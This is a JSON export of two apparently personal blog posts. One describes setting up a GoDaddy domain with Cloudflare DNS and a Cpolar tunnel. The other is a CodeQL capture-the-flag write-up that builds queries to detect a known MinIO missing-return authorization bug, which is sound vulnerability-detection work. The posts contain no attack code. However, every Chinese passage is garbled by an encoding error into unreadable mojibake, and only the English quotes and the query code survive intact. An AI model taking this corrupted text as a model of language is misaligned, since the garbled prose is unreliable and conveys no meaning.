[{"content":"è®°å½•ä¸€æ¬¡åŸŸåè´­ä¹°å¹¶ä½¿ç”¨åœ¨éš§é“æœåŠ¡çš„ç»å† Godaddy åŸŸåè´­ä¹° å…¶å®Godaddyçš„åŸŸåè¿˜æ˜¯åè´µçš„\u0026hellip; ä½†ä¸€å¹´50å—é’±çš„topåŸŸåè¿˜ç®—å¯ä»¥æ¥å—å°±æ˜¯äº†, è€Œä¸”ä¸ç”¨åƒåœ¨å›½å†…è´­ä¹°åŸŸåä¸€æ ·è¦å®ååˆ¶, è€Œä¸”æ”¯æŒæ”¯ä»˜å®, æŒºokçš„.\nCloudflare åŸŸåæ‰˜ç®¡ åœ¨è´­ä¹°åŸŸåå®Œæˆä¹‹å, æˆ‘å‘ç°Godaddyæ˜¯ä¸å…è®¸ä¸ºä¸»åŸŸåè®¾ç½®CNAMEçš„, è¿™å°±æœ‰ç‚¹ä¸èƒ½æ¥å—, ç„¶è€Œå¸ˆå¼Ÿå‘Šè¯‰æˆ‘Cloudflareå¯ä»¥, é‚ç”¨å…¶æ‰˜ç®¡.\nç‚¹å‡»æ·»åŠ åŸŸå, å¡«å…¥åœ¨Godaddyè´­ä¹°çš„åŸŸå\nç‚¹å‡»Continue, ç­‰åˆ°Cloudflareå‘ç°Godaddyä¸‹çš„dnsè®°å½•, ç»§ç»­, çœ‹åˆ°å¥—é¤é¡µé¢é€‰æ‹©å…è´¹çš„å¥—é¤å°±å¯ä»¥äº†, ä¹‹åé€‰æ‹©å¤åˆ¶Cloudflareç»™å‡ºçš„nsè®°å½•.\næ¥åˆ°Godaddyçš„æ§åˆ¶å°, åœ¨DNS -\u0026gt; Nameservers ä¸‹é¢é€‰æ‹©æ”¹å˜nameservers, å°†Cloudflareç»™å‡ºçš„nsè®°å½•å¤åˆ¶è¿›å», ä¿å­˜åç­‰å¾…Cloudflareé¡µé¢å°†åŸŸåçš„çŠ¶æ€æ›´æ–°ä¸ºActive, è¿™æ ·æ‰˜ç®¡å°±å®Œæˆäº†.\nCpolarä½¿ç”¨è‡ªå®šä¹‰åŸŸå æ¥ä¸‹æ¥å°±æ˜¯å°†åŸŸåè§£æåˆ°Cpolaræä¾›çš„éš§é“ä¸­äº†, è¿›å…¥Cpolarçš„æ§åˆ¶é¢æ¿, ç‚¹å‡»è‡ªå®šä¹‰åŸŸå, åˆ›å»ºä¸€ä¸ªcnameè®°å½•.\nç„¶ååœ¨Cloudflareçš„DNSé¢æ¿ä¸­ä¸ºä¸»åŸŸåæ·»åŠ è¿™æ¡CNAME, è¿™æ ·å°±å¯ä»¥æŠŠä¸»åŸŸåè§£æåˆ°cpolaræä¾›çš„éš§é“ä¸­äº†.\nTLS/SSL è¯ä¹¦ åœ¨Cloudflareçš„Origin Serverä¸­, ç‚¹å‡»åˆ›å»ºè¯ä¹¦, ä¸å¾—ä¸æ„Ÿå¹Cloudflareçš„è‰¯å¿ƒ, åœ¨å›½å†…äº‘å‚å•†çº·çº·å¯¹SSLè¯ä¹¦æ”¶è´¹çš„æƒ…å†µä¸‹, Cloudflareèƒ½å¤Ÿæä¾›15å¹´æœ‰æ•ˆæœŸçš„å…è´¹è¯ä¹¦, çœŸçš„å‹å¥½.\nç”³è¯·å®Œæ¯•ä¹‹åå°†è¯ä¹¦å’Œå¯†é’¥ä¸‹è½½ä¸‹æ¥, è¿›å…¥æœ¬åœ°çš„CpolaræœåŠ¡é¢æ¿, æ–°å»ºéš§é“å¹¶ä¸Šä¼ è¯ä¹¦åå¯åŠ¨å³å¯, å¦‚å›¾æ‰€ç¤º.\nPS: å¦å¤–, åœ¨é«˜çº§é€‰é¡¹ä¸­, ä¼¼ä¹HTTPç»‘å®šæ–¹å¼å¿…é¡»ä¸ºåŒæ—¶å¯åŠ¨, å¹¶ä¸”é‡å®šå‘åˆ°HTTPSè¿™ä¸€é¡¹éœ€è¦è®¾ç½®ä¸ºfalse, å¦åˆ™ä¼šå‡ºç°404çš„æƒ…å†µ, ä¸çŸ¥é“ä¸ºä»€ä¹ˆ.\n","permalink":"https://dragonbox.top/posts/tech-domain/","summary":"\u003ch1 id=\"è®°å½•ä¸€æ¬¡åŸŸåè´­ä¹°å¹¶ä½¿ç”¨åœ¨éš§é“æœåŠ¡çš„ç»å†\"\u003eè®°å½•ä¸€æ¬¡åŸŸåè´­ä¹°å¹¶ä½¿ç”¨åœ¨éš§é“æœåŠ¡çš„ç»å†\u003c/h1\u003e\n\u003ch2 id=\"godaddy-åŸŸåè´­ä¹°\"\u003eGodaddy åŸŸåè´­ä¹°\u003c/h2\u003e\n\u003cp\u003eå…¶å®Godaddyçš„åŸŸåè¿˜æ˜¯åè´µçš„\u0026hellip; ä½†ä¸€å¹´50å—é’±çš„topåŸŸåè¿˜ç®—å¯ä»¥æ¥å—å°±æ˜¯äº†, è€Œä¸”ä¸ç”¨åƒåœ¨å›½å†…è´­ä¹°åŸŸåä¸€æ ·è¦å®ååˆ¶, è€Œä¸”æ”¯æŒæ”¯ä»˜å®, æŒºokçš„.\u003c/p\u003e\n\u003ch2 id=\"cloudflare-åŸŸåæ‰˜ç®¡\"\u003eCloudflare åŸŸåæ‰˜ç®¡\u003c/h2\u003e\n\u003cp\u003eåœ¨è´­ä¹°åŸŸåå®Œæˆä¹‹å, æˆ‘å‘ç°Godaddyæ˜¯ä¸å…è®¸ä¸ºä¸»åŸŸåè®¾ç½®CNAMEçš„, è¿™å°±æœ‰ç‚¹ä¸èƒ½æ¥å—, ç„¶è€Œå¸ˆå¼Ÿå‘Šè¯‰æˆ‘Cloudflareå¯ä»¥, é‚ç”¨å…¶æ‰˜ç®¡.\u003c/p\u003e\n\u003cp\u003eç‚¹å‡»æ·»åŠ åŸŸå, å¡«å…¥åœ¨Godaddyè´­ä¹°çš„åŸŸå\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"./adddomain.png\" alt=\"add domain\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eç‚¹å‡»Continue, ç­‰åˆ°Cloudflareå‘ç°Godaddyä¸‹çš„dnsè®°å½•, ç»§ç»­, çœ‹åˆ°å¥—é¤é¡µé¢é€‰æ‹©å…è´¹çš„å¥—é¤å°±å¯ä»¥äº†, ä¹‹åé€‰æ‹©å¤åˆ¶Cloudflareç»™å‡ºçš„nsè®°å½•.\u003c/p\u003e\n\u003cp\u003eæ¥åˆ°Godaddyçš„æ§åˆ¶å°, åœ¨DNS -\u0026gt; Nameservers ä¸‹é¢é€‰æ‹©æ”¹å˜nameservers, å°†Cloudflareç»™å‡ºçš„nsè®°å½•å¤åˆ¶è¿›å», ä¿å­˜åç­‰å¾…Cloudflareé¡µé¢å°†åŸŸåçš„çŠ¶æ€æ›´æ–°ä¸ºActive, è¿™æ ·æ‰˜ç®¡å°±å®Œæˆäº†.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"./nameservers.png\" alt=\"nameservers\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"cpolarä½¿ç”¨è‡ªå®šä¹‰åŸŸå\"\u003eCpolarä½¿ç”¨è‡ªå®šä¹‰åŸŸå\u003c/h2\u003e\n\u003cp\u003eæ¥ä¸‹æ¥å°±æ˜¯å°†åŸŸåè§£æåˆ°Cpolaræä¾›çš„éš§é“ä¸­äº†, è¿›å…¥Cpolarçš„æ§åˆ¶é¢æ¿, ç‚¹å‡»è‡ªå®šä¹‰åŸŸå, åˆ›å»ºä¸€ä¸ªcnameè®°å½•.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"./cpolar-cname.png\" alt=\"cname\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eç„¶ååœ¨Cloudflareçš„DNSé¢æ¿ä¸­ä¸ºä¸»åŸŸåæ·»åŠ è¿™æ¡CNAME, è¿™æ ·å°±å¯ä»¥æŠŠä¸»åŸŸåè§£æåˆ°cpolaræä¾›çš„éš§é“ä¸­äº†.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"./cloudflare-cname.png\" alt=\"Cloudflare cname\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"tlsssl-è¯ä¹¦\"\u003eTLS/SSL è¯ä¹¦\u003c/h2\u003e\n\u003cp\u003eåœ¨Cloudflareçš„Origin Serverä¸­, ç‚¹å‡»åˆ›å»ºè¯ä¹¦, ä¸å¾—ä¸æ„Ÿå¹Cloudflareçš„è‰¯å¿ƒ, åœ¨å›½å†…äº‘å‚å•†çº·çº·å¯¹SSLè¯ä¹¦æ”¶è´¹çš„æƒ…å†µä¸‹, Cloudflareèƒ½å¤Ÿæä¾›15å¹´æœ‰æ•ˆæœŸçš„å…è´¹è¯ä¹¦, çœŸçš„å‹å¥½.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"./ssl.png\" alt=\"ssl\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eç”³è¯·å®Œæ¯•ä¹‹åå°†è¯ä¹¦å’Œå¯†é’¥ä¸‹è½½ä¸‹æ¥, è¿›å…¥æœ¬åœ°çš„CpolaræœåŠ¡é¢æ¿, æ–°å»ºéš§é“å¹¶ä¸Šä¼ è¯ä¹¦åå¯åŠ¨å³å¯, å¦‚å›¾æ‰€ç¤º.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"./ssl-cpolar.png\" alt=\"ssl cpolar\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003ePS: å¦å¤–, åœ¨é«˜çº§é€‰é¡¹ä¸­, ä¼¼ä¹HTTPç»‘å®šæ–¹å¼å¿…é¡»ä¸ºåŒæ—¶å¯åŠ¨, å¹¶ä¸”é‡å®šå‘åˆ°HTTPSè¿™ä¸€é¡¹éœ€è¦è®¾ç½®ä¸ºfalse, å¦åˆ™ä¼šå‡ºç°404çš„æƒ…å†µ, ä¸çŸ¥é“ä¸ºä»€ä¹ˆ.\u003c/p\u003e","title":"åŸŸåé…åˆéš§é“ç©¿é€æœåŠ¡(Godaddy+Cloudflare+Cpolar)"},{"content":"Go and don\u0026rsquo;t return è¿™é“é¢˜ç›®ä»MinIOçš„ä¸€ä¸ªå·²å…¬å¼€çš„æœªæˆæƒè®¿é—®æ¼æ´å¼€å§‹, é€šè¿‡ç¼–å†™å¹¶æ…¢æ…¢å®Œå–„CodeQLè¯­å¥æ¥æ£€æµ‹è¯¥æ¼æ´åœ¨ä»£ç ä¸­çš„ä½ç½®. éšç€é¢˜ç›®çš„è¿›è¡Œ, é¢˜ç›®å°†ç›®æ ‡å°†æ‰©å±•åˆ°æ­¤ç±»æ¼æ´çš„å„ç§å˜ç§, éš¾åº¦é€æ¸åŠ æ·±, éå¸¸é€‚åˆç”¨æ¥å…¥é—¨å’Œå­¦ä¹ . æœ¬æ–‡æ˜¯ç”¨æ¥è®°å½•æˆ‘åœ¨é˜…è¯»å®˜æ–¹é¢˜è§£æ—¶çš„æ€è€ƒè¿‡ç¨‹, å› ä¸ºæˆ‘åœ¨Part2å°±å¡ä½å•¦hhhhhhh.\nğŸ”—åŸé¢˜ç›®é“¾æ¥\nğŸ”—å®˜æ–¹å‚è€ƒé¢˜è§£é“¾æ¥\nåœ¨å¼€å§‹ä¹‹å‰, å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹è¯¥æ¼æ´çš„ç»†èŠ‚ å’Œ æè¿°, å‘ç°è¯¥æ¼æ´çš„åŸç†å…¶å®ååˆ†ç®€å•, å°±æ˜¯åœ¨ if s3Err != ErrNone åˆ¤æ–­ä¹‹åæ²¡æœ‰å°†ä¸åˆæ³•çš„æ§åˆ¶æµè¿”å›, è€Œæ˜¯ä»»ç”±å®ƒç»§ç»­è¿›å…¥æ¥ä¸‹å»çš„claims, s3Err := checkClaimsFromToken(r, cred), å¯¼è‡´æ ¡éªŒå¤±è´¥.\nå…·ä½“çš„æ¼æ´åˆ©ç”¨å¯ä»¥çœ‹è¿™é‡Œ\nPart 1: Letâ€™s catch the bug! 1.1: Finding references to ErrNone Write the query that finds all identifiers named ErrNone. You will find in the documentation the relevant object types to query. Your query should return 231 results.\nimport go from Ident i where i.getName() = \u0026#34;ErrNone\u0026#34; //Identå°±æ˜¯æ ‡è¯†ç¬¦ select i è¿è¡Œåå°±å¯ä»¥æ£€ç´¢å‡ºErrNoneå‡ºç°è¿‡çš„æ‰€æœ‰ä½ç½®.\n1.2: Finding equality tests against ErrNone In this next step, write a query to find all equality test expressions where one of the operands is an identifier called ErrNone. Your query should give you 158 results.\nimport go from EqualityTestExpr e where e.getAnOperand().(Ident).getName() = \u0026#34;ErrNone\u0026#34; select e EqualityTestExpræ˜¯ä¸€ä¸ªç­‰å¼æµ‹è¯•, ä¸º==æˆ–!=, å®ƒæ˜¯ä¸€ä¸ªExpression.\nåœ¨CodeQLä¸­, Expressionæ˜¯èƒ½è®¡ç®—ä¸ºä¸€ç»„å€¼å¹¶ä¸”å…·æœ‰ç±»å‹çš„è¯­å¥, æ¯”å¦‚1+1, \u0026quot;QL\u0026quot;, [1,2,3,4,5].\nä¸ä¹‹å¯¹åº”çš„æ˜¯Statement, ä¾‹å¦‚tryè¯­å¥, ifè¯­å¥ç­‰ç­‰. statementæ²¡æœ‰è¿”å›å€¼, è€Œexpressionæ˜¯æœ‰è¿”å›å€¼çš„.\ne.getAnOperand().(Ident).getName() è¿™å—æ˜¯å…ˆä»EqualityTestExprä¸­è·å–æ“ä½œæ•°, ç„¶åè¿›è¡Œç±»å‹è½¬æ¢åè¿›è¡ŒæŸ¥çœ‹.\n1.3: Finding if-blocks making such a test Write a query that finds all if statements, where the condition is an equality test similar as found in step 1.2. Your query should give you 133 results.\nimport go from IfStmt s where s.getCond().(EqualityTestExpr).getAnOperand().(Ident).getName() = \u0026#34;ErrNone\u0026#34; select s ä»ä¹‹å‰çš„EqualityTestExpræ›¿æ¢ä¸ºäº†IfStmt, ç¼©å°äº†èŒƒå›´.\n1.4: Finding return statements Write a query that finds all return statements. Your query should give 10,651 results.\nimport go from ReturnStmt r select r å¯ä»¥çœ‹å‡ºæ¥codeqlæ”¯æŒè¯†åˆ«çš„statementç§ç±»è¿˜æŒºå¤šçš„.\n1.5: Finding if-blocks without return statements Write a query that finds all if-blocks that donâ€™t contain return statements in their then branch. Your query should return 3541 results. Remember, we are doing baby steps! We just care about the then branch for now!\nè¦æ‰¾æ‰€æœ‰if-blockä¸­ä¸åŒ…å«è¿”å›è¯­å¥çš„.\nimport go from IfStmt i where not i.getThen().getAStmt() instanceof ReturnStmt select i è¿™é‡Œi.getThen().getAStmt()æ˜¯ä»içš„thenåˆ†æ”¯ä¸­è·å–ä¸€ä¸ªstatement, æŒ‰ç†æ¥è¯´å¹¶ä¸ç¡®å®šè¿™ä¸ªstatementæ˜¯å¦æœ¬åº”è¯¥æ˜¯è¿”å›è¯­å¥, æ¯•ç«Ÿå³ä¾¿å­˜åœ¨ReturnStmt, ä¹Ÿå¯èƒ½æ²¡æœ‰è¢«getAStmtè·å–åˆ°. ç„¶è€Œå…³é”®åœ¨äºè¿™ä¸ªnot, å®ƒå’Œä¸ç­‰äºæœ‰ç€å®Œå…¨ä¸åŒçš„å«ä¹‰:\nA != B holds if there is a pair of values (one from A and one from B) that are different. not A = B holds if it is not the case that there is a pair of values that are the same. In other words, A and B have no values in common. è‡³æ­¤å°±æ¯”è¾ƒæ¸…æ¥šäº†\n1.6: Putting it all together Ok, time to find our bug! Combine steps 1.5 and 1.3 and write a query that finds the if-blocks testing for equality to ErrNone with no return. You should get a total of 7 results. Check that the bug we\u0026rsquo;re looking for is one of them\nimport go from IfStmt i where i.getCond().(EqualityTestExpr).getAnOperand().(Ident).getName() = \u0026#34;ErrNone\u0026#34; and not i.getThen().getAStmt() instanceof ReturnStmt select i å°†ä¸Šé¢çš„ç»“åˆå°±å¯ä»¥äº†.\nè‡³æ­¤, å·²ç»å¯ä»¥æ£€æµ‹å‡ºæºå¸¦æ¼æ´ç‰¹å¾çš„ifä»£ç æ‰€åœ¨çš„ä½ç½®äº†.\nPart 2: Improving the precision ä¸Šè¿°codeqlçš„æŸ¥è¯¢ç»“æœä¸­å­˜åœ¨ä¸€äº›è¯¯æŠ¥. ä¸ºäº†å‡å°‘è¯¯æŠ¥, è€ƒè™‘ä½¿ç”¨æ›´ç²¾ç¡®çš„æ•°æ®æµåˆ†ææ¥æ£€æŸ¥isReqAuthenticatedçš„è¿”å›å€¼.\n2.1: Find conditionals that are fed from calls to isReqAuthenticated Write a data flow configuration that tracks data flowing from any call to isReqAuthenticated to any equality test operand. Your query must select all equality tests \u0026ndash; Type: DataFlow::EqualityTestNode \u0026ndash; where the operand is a sink of the above configuration.\nThis gives us 64 potentially interesting conditionals to investigate. Note many of them are not direct calls to isReqAuthenticated, instead they test the result of some intermediate function which in turn calls isReqAuthenticated. The CodeQL global data flow analysis feature allows us to detect those.\nimport go class AuthTestConfig extends DataFlow::Configuration { AuthTestConfig() { this = \u0026#34;auth-test-config\u0026#34; } override predicate isSource(DataFlow::Node source) { source = any(DataFlow::CallNode cn | cn.getTarget().hasQualifiedName(\u0026#34;github.com/minio/minio/cmd\u0026#34;, \u0026#34;isReqAuthenticated\u0026#34;) ).getResult() } override predicate isSink(DataFlow::Node sink) { sink = any(DataFlow::EqualityTestNode n).getAnOperand() } } from AuthTestConfig config, DataFlow::Node sink, DataFlow::EqualityTestNode comparison where config.hasFlow(_, sink) and comparison.getAnOperand() = sink select comparison å“‡å¡, æ˜¯ä¼ è¯´ä¸­çš„æ±¡ç‚¹åˆ†æ! å…¶å®ä¸¥æ ¼æ„ä¹‰ä¸Šä¸ç®—æ˜¯, è¿™ä¸ªç®—æ˜¯æ•°æ®æµè·Ÿè¸ª.\nAuthTestConfigå®šä¹‰äº†æ•°æ®æµé…ç½®, å…¶ä¸­isSourceå’ŒisSinkåˆ†åˆ«å®šä¹‰äº†æ±¡ç‚¹åˆ†æä¸­çš„æ•°æ®æµèµ·ç‚¹Sourceå’Œæ•°æ®æµç»ˆç‚¹Sink. è¿™é‡ŒSourceä¸ºè°ƒç”¨isReqAuthenticatedå‡½æ•°çš„èŠ‚ç‚¹, Sinkæ˜¯æ¯”è¾ƒæµ‹è¯•èŠ‚ç‚¹ä¸­çš„æ“ä½œæ•°.\næ ¹æ®æ–‡æ¡£, anyè¿™ç©æ„çš„ç”¨æ³•å¦‚ä¸‹\nany(\u0026lt;variable declarations\u0026gt; | \u0026lt;formula\u0026gt; | \u0026lt;expression\u0026gt;) \u0026lt;formula\u0026gt;æ˜¯å¯¹variableçš„è¦æ±‚, å¯¹äºæ¯ä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„å˜é‡éƒ½ä¼šè¿”å›ä¸€ä¸ª\u0026lt;expressions\u0026gt;, å¦‚æœæ²¡æœ‰\u0026lt;expressions\u0026gt;å°±è¿”å›variableæœ¬èº«, å› æ­¤å¯èƒ½ä¼šè¿”å›å¤šä¸ª.\né‚£ä¹ˆé—®é¢˜æ¥äº†, sourceæˆ–è€…sinkæ˜¯æ€ä¹ˆå’Œanyçš„å¤šä¸ªè¿”å›å€¼è¿›è¡Œæ¯”è¾ƒçš„å‘¢? å…¶å®ç­”æ¡ˆåœ¨æ–‡æ¡£ä¸­å·²ç»æè¿°äº†:\nFor expressions A and B, the formula A = B holds if there is a pair of valuesâ€”one from A and one from Bâ€”that are the same. In other words, A and B have at least one value in common. For example, [1 .. 2] = [2 .. 5] holds, since both expressions have the value 2.\nå› æ­¤, æ ¹æ®æ–‡æ¡£, 1 = [1..2] æ˜¯æˆç«‹çš„, é‚£ä¹ˆisSourceå’ŒisSinkä¸­çš„æ¯”è¾ƒä¹Ÿæ˜¯æˆç«‹çš„.\næœ€å, config.hasFlow(_, sink) ä¸­å°†sourceéƒ¨åˆ†è®¾ç½®ä¸º_, å› ä¸ºæˆ‘ä»¬çš„æŸ¥è¯¢ä¸­å¹¶ä¸åŒ…å«source, è€Œcomparison.getOperand() = sinkä¹Ÿæ˜¯æ–¹ä¾¿å»æŸ¥è¯¢å‡ºç›¸åº”çš„æ¯”è¾ƒæµ‹è¯•èŠ‚ç‚¹.\n2.2: Find the true bug! We can now put this dataflow query together with our query from step 1.6, and find all if statements that\nAre one of the equality tests returned in 2.1 Are testing equality against ErrNone Do not contain a return statement in their then branch import go class AuthTestConfig extends DataFlow::Configuration { AuthTestConfig() { this = \u0026#34;auth-test-config\u0026#34; } override predicate isSource(DataFlow::Node source) { source = any(DataFlow::CallNode cn | cn.getTarget().hasQualifiedName(\u0026#34;github.com/minio/minio/cmd\u0026#34;, \u0026#34;isReqAuthenticated\u0026#34;) ).getResult() } override predicate isSink(DataFlow::Node sink) { sink = any(DataFlow::EqualityTestNode n).getAnOperand() } } EqualityTestExpr getAnAuthCheck() { exists(AuthTestConfig config, DataFlow::Node sink, DataFlow::EqualityTestNode comparison | config.hasFlow(_, sink) and comparison.getAnOperand() = sink | result = comparison.asExpr() ) } from IfStmt i where i.getCond() = getAnAuthCheck() and i.getCond().(EqualityTestExpr).getAnOperand().(Ident).getName() = \u0026#34;ErrNone\u0026#34; and not i.getThen().getAStmt() instanceof ReturnStmt select i å°†ä¹‹å‰çš„éƒ¨åˆ†ç»“åˆèµ·æ¥å°±å¯ä»¥äº†. è¿™é‡Œæ–°å‡ºç°äº†ä¸€ä¸ªexists, å…¶ç”¨æ³•ä¸º:\nexists(\u0026lt;variable declarations\u0026gt; | \u0026lt;formula\u0026gt;) å½“å­˜åœ¨ä¸€ä¸ªå˜é‡ä½¿å¾—formulaæˆç«‹, å…¬å¼æˆç«‹, è€Œformulaå¯ä»¥æœ‰å¤šä¸ª, å³\nexists(\u0026lt;variable declarations\u0026gt; | \u0026lt;formula 1\u0026gt; | \u0026lt;formula 2\u0026gt; |...| \u0026lt;formula n\u0026gt;) ç­‰ä»·äº\nexists(\u0026lt;variable declarations\u0026gt; | \u0026lt;formula 1\u0026gt; and \u0026lt;formula 2\u0026gt; and...and \u0026lt;formula n\u0026gt;) å¦‚æœè‡³å°‘å­˜åœ¨ä¸€ç»„variablesä½¿å¾—å…¨éƒ¨formulaéƒ½æ»¡è¶³, é‚£ä¹ˆå…¬å¼æˆç«‹.\nè€Œé¢˜è§£ä¸­çš„è¿™ç§å†™æ³•, ç›¸å½“äºç­‰å‰é¢æ‰€æœ‰çš„formulaéƒ½æ»¡è¶³çš„æ—¶å€™, ä¸´æ—¶å˜é‡resultä¼šè¢«èµ‹å€¼ comparison.asExpr() , è€Œresultåˆæ˜¯ getAnAuthCheck çš„è¿”å›å€¼, å› æ­¤å°±å˜æˆ: è¿”å›ä¸€ç»„æ»¡è¶³è¿ç®—å•å…ƒæ˜¯æ±¡ç‚¹æºçš„ EqualityTestExpr.\nPart 3: Expanding the query è¿™éƒ¨åˆ†è¦æ‰©å¤§èŒƒå›´, ä¸å†å±€é™äºMinIOäº†, ä½¿ç”¨çš„æ£€æµ‹å¯¹è±¡æ˜¯è¿™é“é¢˜ç›®é™„å¸¦çš„database.\n3.1: Conditional polarity You might have noticed this in step 1.6: our code looking for equality tests encompases both x == ErrNone and x != ErrNone and checks the then block in both cases. This is wrong. It ought to check the \u0026ldquo;then\u0026rdquo; or \u0026ldquo;else\u0026rdquo; case of an if block, depending on which form of conditional is used. Modify your query to fix this problem. Your query should be able to detect all bad examples in conditionalPolarities.go. Hint: Check out the predicate EqualityTestExpr.getPolarity\néœ€è¦æ ¹æ®x==ErrNoneå’Œx!=ErrNoneçš„ä¸åŒæƒ…å†µè¿›è¡Œä¸åŒæ£€æŸ¥.\nimport go class AuthTestConfig extends DataFlow::Configuration { AuthTestConfig() { this = \u0026#34;auth-test-config\u0026#34; } override predicate isSource(DataFlow::Node source) { source = any(DataFlow::CallNode cn | cn.getTarget().hasQualifiedName(\u0026#34;github.com/minio/minio/cmd\u0026#34;, \u0026#34;isReqAuthenticated\u0026#34;) or // Note new source function: cn.getTarget().hasQualifiedName(\u0026#34;github.com/github/codeql-ctf-go-return\u0026#34;, \u0026#34;errorSource\u0026#34;) ).getResult() } override predicate isSink(DataFlow::Node sink) { sink = any(DataFlow::EqualityTestNode n).getAnOperand() } } EqualityTestExpr getADirectAuthCheck(boolean polarity) { exists(AuthTestConfig config, DataFlow::Node sink, DataFlow::EqualityTestNode comparison | config.hasFlow(_, sink) and comparison.getAnOperand() = sink | result = comparison.asExpr() and polarity = result.getPolarity() ) } /** * Given `ifStmt`\u0026#39;s condition compares some `x` against `ErrNone` with `polarity` (true means checking * equality; false checking inequality), return the block reached when `x != ErrNone`. */ BlockStmt getErrorBranch(IfStmt ifStmt, boolean polarity) { polarity = [true, false] and if polarity = true then result = ifStmt.getElse() else result = ifStmt.getThen() } from IfStmt i, boolean testPolarity where i.getCond() = getADirectAuthCheck(testPolarity) and i.getCond().(EqualityTestExpr).getAnOperand().(Ident).getName() = \u0026#34;ErrNone\u0026#34; and not getErrorBranch(i, testPolarity).getAStmt() instanceof ReturnStmt select i é‡ç‚¹æ˜¯if polarity = true then result = ifStmt.getElse() else result = ifStmt.getThen()è¿™ä¸€å¥.\nå¦å¤–polarity = [true, false]è¿™ä¸ªæ˜¯å¯¹å˜é‡çš„é™åˆ¶, åœ¨æ–‡æ¡£ä¸­æœ‰ç›¸å…³çš„æè¿°\nIt must be possible to evaluate a predicate in a finite amount of time, so the set it describes is not usually allowed to be infinite. In other words, a predicate can only contain a finite number of tuples.\nå¦‚æœæ²¡æœ‰polarity = [true, false], è™½ç„¶ç†è®ºä¸Šæ¥è¯´booleanå˜é‡ä¹Ÿåªæœ‰ä¸¤ä¸ªå€¼, ä½†æ˜¯ç»Ÿä¸€èµ·è§è¿˜æ˜¯éœ€è¦åšé™åˆ¶.\n3.2: More blocks Let\u0026rsquo;s detect more blocks that must return. For example, our query fails to detect a return statement in an else branch, and there are other such cases that we need to handle, such as cascading else or switch/case. Modify your query to find more blocks that donâ€™t return. Your query should be able to detect all bad examples in moreWaysToReturn.go. Hints: While we could recursively inspect the control-flow structures inside the if block, it may help to use the control-flow graph. Check the documentation of the class IR::ReturnInstruction, a control-flow graph node corresponding to a return statement, and the getAPredecessor() / getASuccessor() methods of its superclass ControlFlow::Node, which traverse control-flow graph edges. A passing or failing if test is always followed by a ConditionGuardNode that indicates which branch was taken.\nTip: Try creating a temporary query such as the one below to get an idea what the control flow graph looks like.\nfrom ControlFlow::Node pred, ControlFlow::Node succ where succ = pred.getASuccessor() // you can also restrict `pred` to come from a particular source file select pred, succ è¦å¯»æ‰¾æ›´å¤šåˆ†æ”¯è¯­å¥ä¸­çš„æ²¡æœ‰è¿”å›çš„éƒ¨åˆ†.\nimport go class AuthTestConfig extends DataFlow::Configuration { AuthTestConfig() { this = \u0026#34;auth-test-config\u0026#34; } override predicate isSource(DataFlow::Node source) { source = any(DataFlow::CallNode cn | cn.getTarget().hasQualifiedName(\u0026#34;github.com/minio/minio/cmd\u0026#34;, \u0026#34;isReqAuthenticated\u0026#34;) or cn.getTarget().hasQualifiedName(\u0026#34;github.com/github/codeql-ctf-go-return\u0026#34;, \u0026#34;errorSource\u0026#34;) ).getResult() } override predicate isSink(DataFlow::Node sink) { sink = any(DataFlow::EqualityTestNode n).getAnOperand() } } EqualityTestExpr getAnAuthCheck() { exists(AuthTestConfig config, DataFlow::Node sink, DataFlow::EqualityTestNode comparison | config.hasFlow(_, sink) and comparison.getAnOperand() = sink | result = comparison.asExpr() ) } ReturnStmt getAReturnStatementInBlock(BlockStmt b) { result = b.getAChild*() } predicate mustReachReturnInBlock(ControlFlow::Node node, BlockStmt b) { node.(IR::ReturnInstruction).getReturnStmt() = getAReturnStatementInBlock(b) or forex(ControlFlow::Node succ | succ = node.getASuccessor() | mustReachReturnInBlock(succ, b)) } from IfStmt i, ControlFlow::ConditionGuardNode ifSucc where i.getCond() = getAnAuthCheck() and i.getCond().(EqualityTestExpr).getAnOperand().(Ident).getName() = \u0026#34;ErrNone\u0026#34; and ifSucc.ensures(DataFlow::exprNode(i.getCond()), true) and not mustReachReturnInBlock(ifSucc, i.getThen()) select i ifSucc.ensures(DataFlow::exprNode(i.getCond()), true) æ¶‰åŠåˆ°äº†æ§åˆ¶æµèŠ‚ç‚¹ifSucc, è¿™æ¡è¯­å¥çš„æ„æ€æ˜¯ ç¡®ä¿i.getCond()çš„æ¡ä»¶æˆç«‹, æˆç«‹ä¹‹åæ‰å¯¹thenåˆ†æ”¯çš„è¯­å¥è¿›è¡Œåˆ†æ.\nå…³äºConditionGuardNode, æ–‡æ¡£ä¸­çš„æœ‰ç›´è§‚çš„å®ä¾‹.\nå¯¹äºä»¥ä¸‹ä»£ç \nx := 0 if p != nil { x = p.f } return x å…¶ConditionGuardNodeä¸ºå›¾ä¸­çš„p != nil is trueå’Œp != nil is false.\nå½“å˜é‡è°ƒç”¨è°“è¯(predicate)çš„æ—¶å€™, å¦‚æœå­˜åœ¨ç»“æœ, é‚£ä¹ˆè¿™ç§è°ƒç”¨æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼, å¦åˆ™å°±æ˜¯ä¸€ä¸ªå…¬å¼. è¿”å›ç»“æœçš„è°“è¯å¯ä»¥åœ¨ç»è¿‡é€»è¾‘åˆ¤æ–­åè¿”å›å¤šä¸ªç»“æœ, ä¾‹å¦‚\nstring getANeighbor(string country) { country = \u0026#34;France\u0026#34; and result = \u0026#34;Belgium\u0026#34; or country = \u0026#34;France\u0026#34; and result = \u0026#34;Germany\u0026#34; or country = \u0026#34;Germany\u0026#34; and result = \u0026#34;Austria\u0026#34; or country = \u0026#34;Germany\u0026#34; and result = \u0026#34;Belgium\u0026#34; } å¯¹äºä¸Šè¿°predicate, å¦‚æœcountryä¸º\u0026quot;Germany\u0026quot;, 